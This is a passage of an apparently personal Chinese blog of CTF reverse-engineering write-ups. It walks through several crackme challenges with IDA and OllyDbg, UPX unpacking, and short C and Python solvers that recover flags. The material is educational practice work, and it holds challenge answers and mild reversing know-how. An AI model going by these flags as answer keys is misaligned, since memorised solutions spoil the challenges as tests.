sub_401000(v108, <span class="number">42</span>);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">26</span>], v120[<span class="number">25</span>]);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">27</span>], v120[<span class="number">12</span>]);</span><br><span class="line">  v109 = v120[<span class="number">27</span>];</span><br><span class="line">  v110 = sub_401220(&amp;v120[<span class="number">28</span>], <span class="number">1</span>);</span><br><span class="line">  v111 = sub_401000(v110, v109);</span><br><span class="line">  sub_401220(v111, <span class="number">1</span>);</span><br><span class="line">  v112 = v120[<span class="number">23</span>];</span><br><span class="line">  v113 = sub_401220(&amp;v120[<span class="number">29</span>], <span class="number">1</span>);</span><br><span class="line">  v114 = sub_401100(v113, <span class="number">1000000</span>);</span><br><span class="line">  sub_401000(v114, v112);</span><br><span class="line">  v115 = v120[<span class="number">27</span>];</span><br><span class="line">  v116 = sub_401000(&amp;v120[<span class="number">30</span>], <span class="number">1</span>);</span><br><span class="line">  sub_401100(v116, v115);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">31</span>], v120[<span class="number">30</span>]);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CTF&#123;"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>, (v120[j]));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h3><p>又是C++的题, 对于初学, 我看这个有些还是很吃力的, 有些函数功能连蒙带猜. 其实静下心来分析, 逻辑还是很简单.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421172942651-1590549186380-1591952692434.png" alt="image-20200421172942651-1590549186380"></p><p>找到关键函数进去后, 看起来很多, 但逻辑也是不难的. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421173112461-1590549193146-1591952706873.png" alt="image-20200421173112461-1590549193146"></p><p>这是程序的算法, 我挨个记录了下来……..我在到这步的时候, 就是在纠结那个取余多解的问题, 想到算起来很烦, 但由于是可输入的字符, 我们用遍历即可 (0-127)</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421173211318-1590549201703-1591952713057.png" alt="image-20200421173211318-1590549201703"></p><p>最后附上,  代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first[] = &#123;<span class="number">0x41</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x45</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> second[] = &#123;<span class="number">0x2ef</span>, <span class="number">0x2c4</span>, <span class="number">0x2dc</span>, <span class="number">0x2c7</span>, <span class="number">0x2de</span>, <span class="number">0x2fc</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> third[] = &#123;<span class="number">0x1d7</span>, <span class="number">0xc</span>, <span class="number">0x244</span>, <span class="number">0x25e</span>, <span class="number">0x93</span>, <span class="number">0x6c</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> mod[<span class="number">18</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">666</span>, j = <span class="number">0</span>, z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mod[i] = n;</span><br><span class="line">n += n%<span class="number">5</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i += <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = first[j];</span><br><span class="line"></span><br><span class="line">flag[i+<span class="number">2</span>] = second[j] ^ mod[i+<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(z = <span class="number">0</span>; z &lt; <span class="number">127</span>; z++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((flag[i] ^ mod[i])*(z^mod[i+<span class="number">1</span>]) % second[j] == third[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i+<span class="number">1</span>] = z;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">j++;</span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结: 程序中注意看清传入参数时,是一个字节, 还是一个int类型(4个字节); 取余运算, 逆向时, 一般遍历即可.</p><h3 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h3><p>首先, 下载下来, 用ida打开, 发现没有输入的地方. 或许是隐藏起来了. 就在linux中运行一下来看, 果然没有输入, 只是输出验证失败.</p><p>回到ida, 逻辑也很清楚, 就是一个函数的返回值 非0 即可, 进入关键函数: 也很简单, 就是一个递归调用. 从0开始, 每次 (a1) 都符合相应的值且最要最后的跳出递归即可.通过这个我们就知道了 a1数组的值.  算了一下 a2的值为: 0 7 1 3 6 5 9 4 2, 而2没有就跳出. 按照这个顺序取 (a1) .</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421190646720-1590549218465-1591952718294.png" alt="image-20200421190646720-1590549218465"></p><p>其实浏览程序的时候, 已经看过 验证通过下面的一个函数, 就是让33个已经编码了的字符与我们得到的 (a1)异或运算, 再打印出flag. 下面C代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="number">105</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">100</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;<span class="keyword">char</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> n[<span class="number">33</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">45</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">65</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(A.n[i] ^ a[i % <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="百越杯2018-crazy"><a href="#百越杯2018-crazy" class="headerlink" title="百越杯2018-crazy"></a>百越杯2018-crazy</h3><p>首先，这道题的算法很简单，就是考引用C++的字符串类的函数。 但是自己也挖掘了一些感觉有用的东西，主要是通过这道题总结 c++字符串类。</p><p>拖入ExeinfoPe，题目是64为elf文件，用64为ida打开。</p><p>找到主函数， 查看伪代码，发现很冗长，但大多数都是那些字符串类函数和无用的信息。 我们可以先通过点击最后比较要用到的字符串的名称，这时会把所有相同名称都高亮显示出来，就可以通过逻辑判断出那些是关键函数和变量。</p><p>第一个关键函数  <strong>HighTemplar::HighTemplar((DarkTemplar *)&amp;v23，(__int64)&amp;input);</strong> </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427213407581.png" alt="image-20200427213407581"></p><p>第二个关键函数 <strong>HighTemplar::calculate((HighTemplar *)&amp;v23);</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427213610870.png" alt="image-20200427213610870"></p><p>第三个关键函数 <strong>HighTemplar::getSerial((HighTemplar *)&amp;v23)</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427213959893.png" alt="image-20200427213959893"></p><p>最后wp：但是要引起注意的是这个flag真的奇怪，开始以为算错了，检查几遍，最后就是这个 <strong>tMx~qdstOs~crvtwb~aOba}qddtbrtcd</strong>  再加上flag{}</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"327a6c4304ad5938eaf0efb6cc3e53dc"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i] - <span class="number">11</span>) ^ <span class="number">0x13</span>;</span><br><span class="line">a[i] = (a[i] - <span class="number">23</span>) ^ <span class="number">0x50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong>先说一下做这个题想过的一个问题。  我们知道 <strong>rodata</strong> 段是只读的，存放常量等，但是这里却有字符串地址的赋值，他把 <strong>0x401EA0</strong> 地址的值改变了，但为什么可以这样呢，查了资料，也想了很久，最后认为应该是存放的指针,而且我们可以看到这一段都是8字节的增加，都是一个指针 8字节的大小。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427215217839.png" alt="image-20200427215217839"></p><p>这里也通过查资料，知道了以前学习指针的疑问。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427215908475.png" alt="image-20200427215908475"></p><p><strong>因为我们初始化一个数组时,数组的初始值放在rodata段里面。数组对应开辟的空间上的数值存放在栈上,编译器会去访问rodata段上的初始值然后取来初始化局部变量，因此数组的值才能修改。 而指针指向的是rodata段，是不能被修改的</strong>。</p><p>第二个就是通过c++官方手册的查询对各种c++引用的各种字符串的总结。 下面的 a b 为字符数组。</p><table><thead><tr><th align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::operator<a href="a，i"></a></char></char></th></tr></thead><tbody><tr><td align="left">即 <strong>a[i]</strong> 的意思，如果operator后面没有 <strong>[]</strong>，那就是  <strong>a+i</strong></td></tr><tr><td align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::basic_string(a，b，lenth)</char></char></td></tr><tr><td align="left">即  <strong>strncpy(a，b，lenth)</strong>  第三个参数可选</td></tr><tr><td align="left">std::allocator<char>::~allocator(a)  <strong>发现只要前面有个 ~ 的都是释放</strong>。</char></td></tr><tr><td align="left">即 <strong>free(a)</strong></td></tr><tr><td align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::length(a)</char></char></td></tr><tr><td align="left">即 <strong>strlen(a)</strong></td></tr><tr><td align="left">std::operator&lt;&lt;&lt;std::char_traits<char>&gt;(&amp;std::cout，”hello”) 后面总跟着下面一句。 <strong>关键是count</strong></char></td></tr><tr><td align="left">std::ostream::operator&lt;&lt;(v1，(__int64)&amp;std::endl&lt;char,std::char_traits<char>&gt;)                                                                     即  <strong>printf(“hello”)</strong></char></td></tr><tr><td align="left">std::operator&gt;&gt;&lt;char,std::char_traits<char>,std::allocator<char>&gt;(&amp;std::cin，&amp;a) <strong>关键是in</strong></char></char></td></tr><tr><td align="left">即 <strong>gets(a)</strong></td></tr></tbody></table><hr><h3 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h3><blockquote><p>C++逆向的题，刚开始接触很多代码看不懂,感觉可读性低。  但是看多了，还是会好很多。 是一个慢慢熟悉stl的过程吧。</p></blockquote><p>经过了一些CPP逆向题的折磨，这个题大多数函数连懵带猜的看起来还好，但是遇到了一个不仔细的错误，想了很久。。。。。</p><p>64位elf文件，载入ida，函数的大部分还是看懂了。 2个关键函数。  <strong>transform  accumulate</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510182506239.png" alt="image-20200510182506239"></p><p>先进入 transform。 算法也是很简单，就是函数读起来更麻烦。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510182650313.png" alt="image-20200510182650313"></p><p>下面 accumulate。 这个看起来就不是那么容易了，有很多地址传过来传过去就很混淆。 那就ida动态调试看看这个函数是做什么。(也是这里自己想了很久的错误，虽然很简单的，可能是stl把自己搞昏了吧)。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510183307210.png" alt="image-20200510183307210"></p><p>发现错误，重新调试后得到经过 accumulate 函数后的结果。 把结果都记录下来后。 发现只是把 transform函数后的结果进行了逆序。<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510183543551.png" alt="image-20200510183543551"></p><p>开始写 exp:  得到 <strong>987 -377 -610 -754 -843 -898 -932 -953 -966 -974 -979 -982 -984 -985 -986 -986</strong>。 最后在linux下运行程序输入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio。h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!a || a == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fib(a<span class="number">-1</span>) + fib(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = fib(i); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">15</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, flag[i] = (i &lt; <span class="number">15</span> ? flag[i] - flag[<span class="number">15</span>]:flag[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510184751024.png" alt="image-20200510184751024"></p><p><strong>总结：注意传递的参数是指针还是值。</strong></p><h3 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows_Reverse2"></a>Windows_Reverse2</h3><p>首先,因为是个.exe文件, 先打开看一下程序是做什么的, 出现 <strong>input code:</strong> 也就是让我们输入一个密码验证.</p><p>用ida打开, 还是先 shift + 12 搜索一下字符串, 然而并没有发现我们打开程序看到的 *<em>input code: *</em>,并且程序函数也很少, 那就是加壳了的. 开始也忘了用软件查一下壳.</p><p>那么用OD打开, 使用堆栈平衡的方法, 找到程序的 OEP, 然后dump, 但是注意改一下加载的初始地址和入口点,   这个程序并不是 0x400000开始, 每次加载都是不一样的地址,应该是 ASLR保护技术吧, 之前有了解过一些.通过内存窗口, 知道了是 0x1F0000.&lt;!– </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429150859645-1591162094958.png" alt="image-20200429150859645"></p><p>dump出后,但是打不开, 之前学习脱壳时了解过,但是没有实践. 就去下载<strong>import rec</strong>,但打开找不到桌面的文件,  试了好几个也不行, 百度也无果. 也不想用脱壳软件,主要想操作一下. 其实对于去ida反编译已经足够了,因为那个只是会影响动态链接的函数.</p><p>ida再次打开后, 找到主函数, 转换为伪代码, 逻辑很简单, 就是把我们输入的字符先进行判断,然后进行加密,与编码的字符对比. 先看判断函数.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429152407648-1590489723012-1591162107894.png" alt="image-20200429152407648-1590489723012"></p><p>然后看关键的加密函数, 发现最下面还有一个函数 sub_A71000.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429155217177-1590489885930-1591162119539.png" alt="image-20200429155217177-1590489885930"></p><p>sub_A7100, 刚开始看这个函数觉得很麻烦, 但是从以前做的题来看, 并且这个函数有 &gt;&gt; 运算符. 可以往base编码考虑, 那就先看看有没有base编码的标志.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429160021209-1590489939494-1591162126116.png" alt="image-20200429160021209-1590489939494"></p><p>到了这里 , 可以知道, 程序只是标准码换了一下. 我们就用程序编码的数据和 0x76 异或运算得到 得到这里的base64 的码. 然后这个码去解码后面用来做比较的字符,得到第一次转换后的结果. 但是异或运算后, 我们发现这个码就是base64标准码.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429162141561-1590490034442-1591162136025.png" alt="image-20200429162141561-1590490034442"></p><p>最后, 知道开始是把我们输入的字符进行数值转换的, 那么最后解码后我们也要还原一下. 懒得C语言自己写了, 用 python 的 hex(). 最后 flag就是  <strong>ADEBDEAEC7BE</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s =  base64.b64decode(<span class="string">'reverse+'</span>)</span><br><span class="line"><span class="keyword">print</span> (type(s)) / 刚学python,查看一下是什么类型,因为用hex(), 发现 list, tuple都没有 hex().</span><br><span class="line"><span class="keyword">print</span> (s.hex().upper())</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501113755270-1590490003811-1591162636827.png" alt="image-20200501113755270-1590490003811"></p><p><strong>总结: 1.题目有时候看起来代码很冗长, 但逻辑不难的, 细心分析一下.  要注意base家族的编码与解码.   2.正在学习python中, 每次写python脚本都有收获.</strong></p><table><thead><tr><th>字符串前添加r , 表示后续的字符串原样输出, 不进行转义. 如 \\ 转义后为 \</th></tr></thead><tbody><tr><td><strong>字符串前添加b, 后面字符串是bytes 类型</strong></td></tr><tr><td><strong>在 Python3 中，bytes 和 str 的互相转换方式是:str.encode(‘utf-8’)   bytes.decode(‘utf-8’)</strong></td></tr></tbody></table><h3 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h3><p>首先这道题与上面的一道是一起的, 做了上面的一道题, 觉得应该还是有壳的, 查一下是 upx.</p><p>载入OD还是使用堆栈平衡的原理脱壳, 发现同样是每次载入的地址不一样, 脱壳后还是不能运行, 还是要修复输入表, 但import rec又找不到我电脑的文件…….就先把题做了再来研究.</p><p>ida载入后十分简洁. 一个加密函数后进行判断. 看加密函数.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430190548596-1590490212309-1591162149285.png" alt="image-20200430190548596-1590490212309"></p><p>因为上面的 Reverse1 也是又同样的问题(<strong>不同的变量如何联系在一起的</strong>), 变量地址是相同的. 就先看看上面 <strong>v1的地址, 发现是 ecx 传来的</strong>, 那再看看上一层函数的 ecx . 发现在调用这个加密函数之前有一个ecx赋值. <strong>而要用来最后比较的 v4变量, 它的地址和传给ecx是一样的</strong>.  <strong><em>那这里就是通过寄存器传递的参数.</em></strong></p><p>上面的代码觉得奇怪, 怀疑是ida的原因, 把原程序到 OD 动态调试看一下加密函数.  清晰很多.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430192452991-1590490227510-1591162179011.png" alt="image-20200430192452991-1590490227510"></p><p>所以这个函数就是通过我们输入的ASCII为索引值来依次取出编码字符的数据, 最后<strong>DDCTF{reverseME}</strong>进行比较.</p><p>可以看到是从 0x402FF8 为首地址开始索引, 但是从ida中可以知道 可打印字符是从0x403018开始的.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430200350749-1590490244163-1591162185500.png" alt="image-20200430200350749-1590490244163"></p><p>最后,我遇到的很大的坑…..🤣, 字符串复制下来后, 我没有处理其中的  \  的字符, 那么就被默认为转义字符了, 导致2个字符变成一个, 最后结果肯定错.  花了好多时间找这个错误, 还是没有在细节上注意😢.   <strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 